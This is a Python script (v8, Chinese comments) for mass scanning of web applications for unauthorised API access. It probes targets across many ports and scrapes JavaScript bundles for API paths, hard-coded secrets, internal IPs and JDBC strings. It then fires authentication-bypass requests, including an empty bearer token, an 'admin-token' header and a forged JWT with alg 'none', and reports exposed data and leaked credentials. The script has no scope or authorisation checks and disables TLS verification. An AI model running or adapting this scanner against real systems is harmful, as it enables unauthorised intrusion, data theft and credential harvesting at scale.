#!/usr/bin/env python3
"""
v8: CLI参数化 + 双模式测试 + 调试日志 + Markdown报告 + 风险分级
融合 JSFinder/Webpack_extract/VueCrack/Packer-Fuzzer 技术
"""

import os, re, json, time, ssl, socket, argparse, logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
from urllib.request import Request, urlopen
from urllib.error import HTTPError

# ===== CLI =====
parser = argparse.ArgumentParser(description='JS/API 未授权访问扫描器 v8')
parser.add_argument('--input', default='/tmp/v7_targets.json', help='目标JSON文件')
parser.add_argument('--outdir', default='/tmp/v8_scan_results', help='输出目录')
parser.add_argument('--workers', type=int, default=50, help='并发数')
parser.add_argument('--timeout', type=int, default=12, help='HTTP超时(秒)')
parser.add_argument('--limit', type=int, default=0, help='限制目标数量,0=全部')
parser.add_argument('--dry-run', action='store_true', help='只提取API,不测试')
parser.add_argument('--full-bypass', action='store_true', help='收集所有绕过方法(默认命中断路)')
parser.add_argument('--debug', action='store_true', help='调试日志')
args = parser.parse_args()

log = logging.getLogger('scanner')
log.addHandler(logging.StreamHandler())
log.setLevel(logging.DEBUG if args.debug else logging.WARNING)

TCP_TIMEOUT = 1.5; HTTP_TIMEOUT = args.timeout; API_TIMEOUT = max(6, args.timeout//2)
WORKERS = args.workers; SSL_RETRIES = 2; OUTDIR = args.outdir
os.makedirs(OUTDIR, exist_ok=True)

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

# ===== 正则（从参考项目继承） =====
LINKFINDER_RE = re.compile(r"""
  (?:"|')(((?:[a-zA-Z]{1,10}://|//)[^"'/]{1,}\.[a-zA-Z]{2,}[^"']{0,})|
  ((?:/|\.\./|\./)[^"'><,;|*()(%%$^/\\\[\]][^"'><,;|()]{1,})|
  ([a-zA-Z0-9_\-/]{1,}/[a-zA-Z0-9_\-/]{1,}\.(?:[a-zA-Z]{1,4}|action)(?:[\?|#][^"|']{0,}|))|
  ([a-zA-Z0-9_\-/]{1,}/[a-zA-Z0-9_\-/]{3,}(?:[\?|#][^"|']{0,}|))|
  ([a-zA-Z0-9_\-]{1,}\.(?:\w)(?:[\?|#][^"|']{0,}|)))(?:"|')
""", re.VERBOSE)

WEBPACK_CHUNK_RE = re.compile(r'''\{[^{}]{0,5000}\}\s*\[[^\]]{0,50}\]\s*\+\s*"[^"]*\.js"''')
SENSITIVE_FIELD_RE = re.compile(r'''(?:secret|password|token|apiKey|accessKey|privateKey)\s*[:=]\s*["']([^"']{8,200})["']''', re.I)
INTERNAL_IP_RE = re.compile(r'''(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})''')
JDBC_RE = re.compile(r'''jdbc:[a-z:]+://[a-z0-9\.\-_:;=/@?,&]+''', re.I)
COMMON_LIBS = re.compile(r'(?:jquery|bootstrap|vue\.min|vue\.runtime|react\.min|react\.production|angular\.min|axios\.min|lodash|moment|echarts|swiper|polyfill|fontawesome|materialize|foundation|modernizr|d3\.min|three\.min|popper|zepto|hammer|gsap|anime|datatable|select2|cropper|sweetalert|tinymce|ckeditor|quill|summernote|codemirror|ace-editor|monaco|crypto-js|socket\.io|pdf\.js|jspdf|leaflet|mapbox|openlayers|fabric|highlight|prism|markdown|marked|showdown|chunk-vendors|chunk-common|vendor\.\w{8}\.|vendors\.\w{8}\.|core-js|regenerator|webpack\.runtime|babel|polyfill|h265web|ZLMRTC|missile)', re.I)
VUE_INSTANCE_RE = re.compile(r'''__vue_app__|__vue__|createApp|createRouter|new Vue\(|useRouter|useRoute''')
VUE_ROUTER_RE = re.compile(r'''(?:path|route)\s*:\s*["']([^"']{1,200})["']''', re.I)
REACT_ROUTE_RE = re.compile(r'<Route\s+(?:path|to)\s*=\s*["\x27]([^"\x27]{1,200})["\x27]', re.I)

WEB_PORTS = [80,443,8080,8443,8001,81,82,88,3000,4000,5000,7000,8000,8002,8003,8008,8081,8088,8089,8888,9000,9090,9443,10000,10080]

FAST_BYPASS = [
    ("GET_no_auth","GET",None,None,{}),
    ("POST_JSON_no_auth","POST","application/json",lambda p: json.dumps(p).encode(),{}),
]
FULL_BYPASS = FAST_BYPASS + [
    ("GET_empty_bearer","GET",None,None,{"Authorization":"Bearer "}),
    ("GET_admin_token","GET",None,None,{"Authorization":"Bearer admin-token"}),
    ("POST_FORM_no_auth","POST","application/x-www-form-urlencoded",lambda p: "&".join(f"{k}={v}" for k,v in p.items()).encode(),{}),
    ("POST_JWT_none","POST","application/json",lambda p: json.dumps(p).encode(),{"Authorization":"Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."}),
]

BASELINE_PATHS = [
    "/api/server/media_server/list","/api/device/query/devices?page=1&count=10",
    "/api/user/users?page=1&count=10","/api/server/system/configInfo",
    "/api/server/resource/info","/api/role/all","/api/log/list",
]
AUTH_FAIL_MSGS = ["缺少请求授权令牌","token无效","未登录","请登录","Unauthorized","Forbidden"]

# ===== 工具函数 =====
def tcp_check(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TCP_TIMEOUT)
        r = s.connect_ex((str(host), int(port)))
        s.close()
        return r == 0
    except Exception as e:
        log.debug(f"TCP {host}:{port} failed: {e}")
        return False

def http_get(url, timeout=HTTP_TIMEOUT, max_size=1_000_000):
    for attempt in range(SSL_RETRIES + 1):
        try:
            req = Request(url, headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","Accept":"text/html,application/javascript,application/json,*/*"})
            resp = urlopen(req, timeout=timeout * (attempt + 1), context=ssl_ctx)
            body = b""
            while True:
                try:
                    chunk = resp.read(65536)
                    if not chunk: break
                    body += chunk
                    if len(body) > max_size: break
                except: break
            return resp.getcode(), resp.url, body.decode('utf-8', errors='replace'), resp.headers.get("Content-Type","")
        except HTTPError as e:
            try: return e.code, e.url, e.read().decode('utf-8', errors='replace')[:100000], ""
            except: return e.code, e.url, "", ""
        except Exception as e:
            if 'SSL' in str(e) or 'handshake' in str(e).lower() or 'timed out' in str(e).lower():
                if attempt < SSL_RETRIES:
                    log.debug(f"SSL retry {attempt+1} for {url}")
                    time.sleep(1)
                    continue
            log.debug(f"HTTP GET {url} failed: {e}")
            if attempt == SSL_RETRIES: return None, None, "", ""
    return None, None, "", ""

def extract_apis(js_content):
    apis = set()
    for m in LINKFINDER_RE.finditer(js_content):
        path = m.group(0).strip('"\'`')
        if path.startswith(("http:","https:","//")): continue
        if not path.startswith("/"): path = "/" + path
        path = path.split("?")[0].split("#")[0].rstrip("/")
        if 2 < len(path) < 250 and os.path.splitext(path)[1].lower() not in ('.js','.css','.png','.jpg','.gif','.svg','.ico','.woff','.woff2','.ttf','.eot','.map','.json','.xml','.html','.pdf'):
            apis.add(path)
    for m in WEBPACK_CHUNK_RE.finditer(js_content):
        apis.add(m.group(0)[:200])
    for pat in [
        re.compile(r'''(?:url|path|baseURL|apiUrl)\s*:\s*["']([^"']{2,300})["']''', re.I),
        re.compile(r'''\.(?:get|post|put|delete|patch)\s*\(\s*["']([^"']{2,300})["']''', re.I),
        re.compile(r'''fetch\s*\(\s*["']([^"']{2,300})["']''', re.I),
        re.compile(r'''["'](/api/[a-zA-Z][a-zA-Z0-9_/\-.]{2,200})["']''', re.I),
    ]:
        for m in pat.finditer(js_content):
            path = m.group(1).strip()
            if not path or path.startswith(("http:","https:","//")): continue
            if not path.startswith("/"): path = "/" + path
            path = path.split("?")[0].rstrip("/")
            if 2 < len(path) < 250 and os.path.splitext(path)[1].lower() not in ('.js','.css','.png','.jpg','.gif','.svg','.ico','.woff','.woff2','.ttf','.eot','.map','.json','.xml','.html','.pdf'):
                apis.add(path)
    return apis

def extract_js_from_html(html, base_url):
    js_urls = set()
    if HAS_BS4:
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html, 'html.parser')
            for script in soup.find_all('script', src=True):
                js_urls.add(urljoin(base_url, script['src']))
            for link in soup.find_all('link', rel=['preload','prefetch','modulepreload']):
                href = link.get('href','')
                if href.endswith('.js'): js_urls.add(urljoin(base_url, href))
        except Exception as e:
            log.debug(f"BS4 parse failed: {e}")
    else:
        for m in re.finditer(r'<script[^>]+src\s*=\s*["\x27]?([^"\'<>\s]+\.js[^"\'<>\s]*)["\x27]?', html, re.I):
            js_urls.add(urljoin(base_url, m.group(1)))
    for pat in [WEBPACK_CHUNK_RE, re.compile(r'''["']([^"']*?(?:static/js|js)/[^"']+\.js)["']'''), re.compile(r'''["']([^"']*?js/[a-zA-Z][a-zA-Z0-9_\-\.]+\.js)["']''')]:
        for m in pat.finditer(html):
            chunk = str(m.group(0)).strip('"\'')
            if "/js/" in chunk: js_urls.add(urljoin(base_url, chunk))
    pp = re.search(r'''__webpack_public_path__\s*=\s*["']([^"']+)["']''', html)
    if pp:
        for m in re.finditer(r'''\{(\d+):\s*["']([^"']+)["']''', html):
            js_urls.add(urljoin(base_url, f"{pp.group(1)}{m.group(2)}.js"))
    return js_urls

def extract_links_from_html(html, base_url):
    links = set()
    parsed_base = urlparse(base_url)
    if HAS_BS4:
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html, 'html.parser')
            for a in soup.find_all('a', href=True):
                href = a['href']
                if href.startswith('#') or href.startswith('javascript:'): continue
                full = urljoin(base_url, href)
                if urlparse(full).hostname == parsed_base.hostname and not re.search(r'\.(?:js|css|png|jpg|gif|svg|ico|pdf|doc|zip)(?:\?|$)', full):
                    links.add(full)
        except Exception as e:
            log.debug(f"BS4 link extract failed: {e}")
    return links

def expand_paths(base_url, apis):
    path_parts = [p for p in urlparse(base_url).path.strip('/').split('/') if p]
    prefixes = {'/' + '/'.join(path_parts[:i]) for i in range(len(path_parts)+1)} - {'/'}
    expanded = set(apis)
    for api in apis:
        if not api.startswith('/'): continue
        for p in prefixes: expanded.add(p + api)
        for p in prefixes:
            if api.startswith(p): expanded.add(api[len(p):])
    return expanded

# ===== 响应检测 =====
def risk_level(fi):
    score = 0
    if fi.get('credential_leak'): score += 3
    if fi.get('data_count', 0) > 10: score += 2
    if fi.get('data_keys'):
        keys_str = ' '.join(fi['data_keys']).lower()
        if any(k in keys_str for k in ['secret','password','token','key']): score += 3
        if any(k in keys_str for k in ['phone','email','address','idcard','身份证']): score += 3
    if score >= 5: return 'CRITICAL'
    if score >= 3: return 'HIGH'
    if score >= 1: return 'MEDIUM'
    return 'LOW'

def check_response(body, url, method, test_name):
    if len(body) < 20: return None
    parsed = None
    try: parsed = json.loads(body)
    except: pass
    if parsed and isinstance(parsed, dict):
        code = str(parsed.get("code","") or parsed.get("statusCode","") or parsed.get("status",""))
        msg = str(parsed.get("msg","") or parsed.get("message",""))
        if code in ("10031","401","403","500002","40001"): return None
        if any(p in msg for p in AUTH_FAIL_MSGS): return None
        d = parsed.get("data")
        has_data = (isinstance(d, list) and len(d)>0) or (isinstance(d, dict) and d and set(d.keys())-{"path","time","timestamp","error","status"}) or bool(parsed.get("records")) or bool(parsed.get("list")) or bool(parsed.get("items"))
        if has_data or code in ("0","200","20000"):
            f = {"url":url,"method":method,"test":test_name,"code":code,"msg":msg[:200]}
            if isinstance(d, list): f["data_count"]=len(d)
            elif isinstance(d, dict): f["data_keys"]=list(d.keys())[:15]
            if "secret" in body.lower() or "password" in body.lower(): f["credential_leak"]=True
            f["risk"] = risk_level(f)
            f["raw"] = body[:500]
            return f
    elif parsed and isinstance(parsed, list) and len(parsed)>0:
        return {"url":url,"method":method,"test":test_name,"data_count":len(parsed),"risk":"MEDIUM","raw":body[:500]}
    return None

# ===== API 测试（双模式） =====
def test_api(base_url, path, bypass_tests, short_circuit=True):
    clean = path.split("?")[0].rstrip("/")
    if not clean: return []
    url_base = urljoin(base_url, clean)
    findings = []
    for qs in ["", "?page=1&count=10", "?page=1&size=10"]:
        url = url_base + qs
        for name, method, ct, bf, headers in bypass_tests:
            try:
                data = None
                if method in ("POST","PUT","PATCH") and bf:
                    data = bf({"page":1,"size":10})
                h = {"User-Agent":"Mozilla/5.0","Accept":"application/json"}
                h.update(headers)
                if data and ct: h["Content-Type"] = ct
                req = Request(url, data=data, headers=h, method=method)
                resp = urlopen(req, timeout=API_TIMEOUT, context=ssl_ctx)
                body = resp.read().decode('utf-8', errors='replace')
                f = check_response(body, url, method, name)
                if f:
                    findings.append(f)
                    if short_circuit: return findings
            except HTTPError as e:
                if e.code not in (404,403,405):
                    try:
                        b = e.read().decode('utf-8', errors='replace')
                        f = check_response(b, url, method, name)
                        if f:
                            findings.append(f)
                            if short_circuit: return findings
                    except: pass
            except Exception as e:
                log.debug(f"API {url} {method} failed: {e}")
    return findings

# ===== 主流程 =====
def main():
    print("="*60)
    print(f"v8: CLI参数化 | {'全量绕过' if args.full_bypass else '命中断路'} | 风险分级 | Markdown报告")
    if args.debug: print(f"  debug=ON workers={WORKERS} timeout={HTTP_TIMEOUT}s")
    print("="*60)

    with open(args.input) as f:
        targets_raw = json.load(f)
    targets = [(t['url'], t.get('title',''), t.get('score',0)) for t in targets_raw]
    if args.limit > 0: targets = targets[:args.limit]
    print(f"\n[*] 目标: {len(targets)} | 输入: {args.input} | 输出: {OUTDIR}")

    # Phase 1: TCP
    print(f"\n[Phase 1] TCP探测...")
    live, done = [], 0
    def probe(t_url):
        p = urlparse(t_url) if t_url.startswith("http") else None
        if p and p.hostname:
            port = p.port or (443 if p.scheme=="https" else 80)
            if tcp_check(p.hostname, port): return t_url
        elif not p:
            for port in WEB_PORTS:
                if tcp_check(t_url, port):
                    s = "https" if port in (443,8443) else "http"
                    return f"{s}://{t_url}" if port in (80,443) else f"{s}://{t_url}:{port}"
        return None
    with ThreadPoolExecutor(max_workers=WORKERS*4) as pool:
        futures = {pool.submit(probe, t[0]): t for t in targets}
        for f in as_completed(futures):
            done += 1
            if done % 50 == 0: print(f"  [{done}/{len(targets)}] {len(live)} live")
            try:
                r = f.result()
                if r: live.append(r)
            except Exception as e:
                log.debug(f"Probe failed: {e}")
    print(f"  存活: {len(live)}")

    # Phase 2: JS爬取
    print(f"\n[Phase 2] JS爬取+API提取...")
    bypass_used = FULL_BYPASS if args.full_bypass else FAST_BYPASS
    print(f"  绕过: {'FULL(6种)' if args.full_bypass else 'FAST(2种,短路)'} | dry-run={args.dry_run}")

    api_results, done = [], 0
    def crawl(url):
        p = urlparse(url)
        base = f"{p.scheme}://{p.hostname}"
        if p.port and p.port not in (80,443): base += f":{p.port}"
        status, final_url, html, ct = http_get(url + "/")
        if not status or not html or len(html) < 50:
            return {"base":base,"title":"","apis":list(BASELINE_PATHS),"sensitive":[],"js_count":0}
        title = ""
        m = re.search(r'<title[^>]*>([^<]+)</title>', html, re.I)
        if m: title = m.group(1)[:200]
        if final_url:
            p2 = urlparse(final_url)
            base = f"{p2.scheme}://{p2.hostname}"
            if p2.port and p2.port not in (80,443): base += f":{p2.port}"
        js_urls = extract_js_from_html(html, base)
        links = extract_links_from_html(html, base)
        inline_scripts = re.findall(r'<script[^>]*>([\s\S]*?)</script>', html, re.I)
        all_apis = set()
        for s in inline_scripts:
            if s.strip(): all_apis.update(extract_apis(s))
        if VUE_INSTANCE_RE.search(html):
            for m in VUE_ROUTER_RE.finditer(html): all_apis.add(m.group(1))
        for m in REACT_ROUTE_RE.finditer(html): all_apis.add(m.group(1))
        app_js = [j for j in js_urls if not COMMON_LIBS.search(j)]
        for js_url in list(app_js)[:30]:
            s, _, content, _ = http_get(js_url, max_size=500_000)
            if s != 200 or not content: continue
            all_apis.update(extract_apis(content))
            for m in SENSITIVE_FIELD_RE.finditer(content): all_apis.add(f"SENSITIVE:{m.group(1)[:100]}")
            for m in INTERNAL_IP_RE.finditer(content): all_apis.add(f"INTERNAL_IP:{m.group(0)}")
            for m in JDBC_RE.finditer(content): all_apis.add(f"JDBC:{m.group(0)}")
        crawled = set()
        for link in list(links)[:15]:
            if link in crawled: continue
            crawled.add(link)
            s, _, page, _ = http_get(link)
            if s != 200 or not page or len(page) < 100: continue
            sub_js = extract_js_from_html(page, base)
            for js in sub_js:
                if not COMMON_LIBS.search(js): js_urls.add(js)
            for s in re.findall(r'<script[^>]*>([\s\S]*?)</script>', page, re.I):
                if s.strip(): all_apis.update(extract_apis(s))
        all_apis = expand_paths(base, all_apis)
        all_apis.update(BASELINE_PATHS)
        clean = sorted(a for a in all_apis if not a.startswith(("SENSITIVE:","INTERNAL_IP:","JDBC:")))
        sensitive = [a for a in all_apis if a.startswith(("SENSITIVE:","INTERNAL_IP:","JDBC:"))]
        if not clean: return None
        return {"base":base,"title":title,"apis":clean,"sensitive":sensitive,"js_count":len(app_js)}

    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        futures = {pool.submit(crawl, u): u for u in live}
        for f in as_completed(futures):
            done += 1
            if done % 50 == 0: print(f"  [{done}/{len(live)}] {len(api_results)} with APIs")
            try:
                r = f.result()
                if r: api_results.append(r)
            except Exception as e:
                log.debug(f"Crawl failed: {e}")
    print(f"  Phase 2 DONE: {len(api_results)} hosts")

    if args.dry_run:
        print(f"\n[Dry-run] 跳过测试, 输出API列表")
        with open(os.path.join(OUTDIR, "apis.json"), "w") as f:
            json.dump([{"base":t["base"],"title":t["title"],"apis":t["apis"][:50]} for t in api_results], f, ensure_ascii=False, indent=2)
        print(f"  API列表: {OUTDIR}/apis.json")
        return

    # Phase 3: 两阶段测试
    print(f"\n[Phase 3] 未授权测试 ({'全量绕过' if args.full_bypass else '命中断路'})...")
    flat_tasks, target_map = [], {}
    for t in api_results:
        target_map[t["base"]] = t; t["_f"] = []
        for api in t["apis"][:30]: flat_tasks.append((t, api))
    for t in api_results:
        for bp in BASELINE_PATHS: flat_tasks.append((t, bp))
    print(f"  3a: {len(flat_tasks)} tasks on {len(target_map)} hosts")
    t_start = time.time()
    bypass_3a = bypass_used if args.full_bypass else FAST_BYPASS
    with ThreadPoolExecutor(max_workers=WORKERS*2) as pool:
        def test_flat(task):
            t, api = task
            return t["base"], test_api(t["base"], api, bypass_3a, short_circuit=not args.full_bypass)
        futures = {pool.submit(test_flat, ft): ft for ft in flat_tasks}
        for f in as_completed(futures):
            try:
                base_url, findings = f.result()
                if findings: target_map[base_url]["_f"].extend(findings)
            except Exception as e:
                log.debug(f"Test failed: {e}")
    print(f"  3a 耗时: {time.time()-t_start:.0f}s")

    candidates = []
    for base, t in target_map.items():
        real = [f for f in t["_f"] if f.get("data_count") or f.get("data_keys") or f.get("credential_leak")]
        t.pop("_f", None)
        if real: t["_f3a_real"] = real; candidates.append(t)
    print(f"  3a: {len(candidates)} candidates")

    vulnerable = []
    if candidates:
        deep_tasks, cand_map = [], {}
        for t in candidates:
            cand_map[t["base"]] = t; t["_deep"] = list(t.get("_f3a_real",[]))
            for api in t["apis"][:50]: deep_tasks.append((t, api))
        print(f"  3b: {len(deep_tasks)} deep tasks")
        t_start = time.time()
        with ThreadPoolExecutor(max_workers=WORKERS) as pool:
            def test_deep_flat(task):
                t, api = task
                return t["base"], test_api(t["base"], api, bypass_used, short_circuit=not args.full_bypass)
            futures = {pool.submit(test_deep_flat, dt): dt for dt in deep_tasks}
            for f in as_completed(futures):
                try:
                    base_url, findings = f.result()
                    if findings: cand_map[base_url]["_deep"].extend(findings)
                except Exception as e:
                    log.debug(f"Deep test failed: {e}")
        print(f"  3b 耗时: {time.time()-t_start:.0f}s")

        for t in candidates:
            all_f = t.get("_deep",[])
            if all_f:
                seen = set(); unique = []
                for fi in all_f:
                    k = fi["url"]+fi.get("test","")
                    if k not in seen: seen.add(k); unique.append(fi)
                t["findings"] = unique; t["finding_count"] = len(unique)
                fname = re.sub(r'[^a-zA-Z0-9]','_',t["base"]) + ".json"
                with open(os.path.join(OUTDIR, fname),"w") as f:
                    json.dump(t, f, ensure_ascii=False, indent=2, default=str)
                vulnerable.append(t)
                print(f"\n  [!] {t['base']} | {t['title'][:50]}")
                for fi in unique[:4]:
                    risk = fi.get('risk','?')
                    print(f"      [{risk}] {fi.get('method','')} {fi.get('url','')[:70]}")
                    for k in ["data_count","data_keys","credential_leak"]:
                        if k in fi: print(f"        {k}: {str(fi[k])[:100]}")
                t.pop("_deep",None)
    print(f"\n  Phase 3 DONE: {len(vulnerable)} vulnerable")

    # Phase 4: 报告 (JSON + Markdown)
    print(f"\n[Phase 4] 报告生成")
    report = {"scan_time":time.strftime("%Y-%m-%d %H:%M:%S"),"targets":len(targets),"live":len(live),
              "apis":len(api_results),"vulnerable":len(vulnerable),"findings":[]}
    for v in vulnerable:
        report["findings"].append({"url":v["base"],"title":v.get("title",""),"findings":v.get("findings",[])})
    with open(os.path.join(OUTDIR,"report.json"),"w") as f:
        json.dump(report, f, ensure_ascii=False, indent=2, default=str)

    # Markdown
    md = [f"# 扫描报告 v8\n\n**时间**: {report['scan_time']} | **目标**: {report['targets']} | **存活**: {report['live']} | **API**: {report['apis']} | **漏洞**: {report['vulnerable']}\n"]
    if vulnerable:
        md.append("\n## 漏洞汇总\n\n| # | 风险 | URL | 标题 | 发现数 |\n|---|------|-----|------|--------|")
        for i, v in enumerate(vulnerable):
            risks = [fi.get('risk','LOW') for fi in v.get('findings',[])]
            top = 'CRITICAL' if 'CRITICAL' in risks else 'HIGH' if 'HIGH' in risks else 'MEDIUM' if 'MEDIUM' in risks else 'LOW'
            md.append(f"| {i+1} | {top} | {v['base']} | {v.get('title','')[:30]} | {v.get('finding_count',0)} |")
        md.append("\n## 详细发现\n")
        for i, v in enumerate(vulnerable):
            md.append(f"### [{i+1}] {v['base']} — {v.get('title','')}")
            for fi in v.get('findings',[])[:5]:
                md.append(f"- `{fi.get('method','')}` [{fi.get('risk','?')}] {fi.get('url','')}")
                if fi.get('data_count'): md.append(f"  - 数据量: {fi['data_count']}")
                if fi.get('data_keys'): md.append(f"  - 字段: {', '.join(fi['data_keys'][:8])}")
                if fi.get('credential_leak'): md.append(f"  - ⚠️ 凭证泄露")
            md.append("")
    else:
        md.append("\n未发现漏洞。\n")

    bypass_counts = {}
    for v in vulnerable:
        for fi in v.get('findings',[]):
            t = fi.get('test','?'); bypass_counts[t] = bypass_counts.get(t,0)+1
    if bypass_counts:
        md.append("\n## 绕过方法统计\n\n| 方法 | 命中次数 |\n|------|----------|")
        for t, c in sorted(bypass_counts.items(), key=lambda x:-x[1]): md.append(f"| {t} | {c} |")
    with open(os.path.join(OUTDIR,"report.md"),"w") as f:
        f.write('\n'.join(md))

    print(f"  报告: {OUTDIR}/report.json, {OUTDIR}/report.md")
    elapsed = time.time() - t_start if 't_start' in dir() else 0
    print(f"\n{'='*60}")
    print(f"SCAN COMPLETE: {len(targets)}→{len(live)}→{len(api_results)}→{len(vulnerable)}")
    print(f"{'='*60}")

if __name__ == "__main__":
    main()
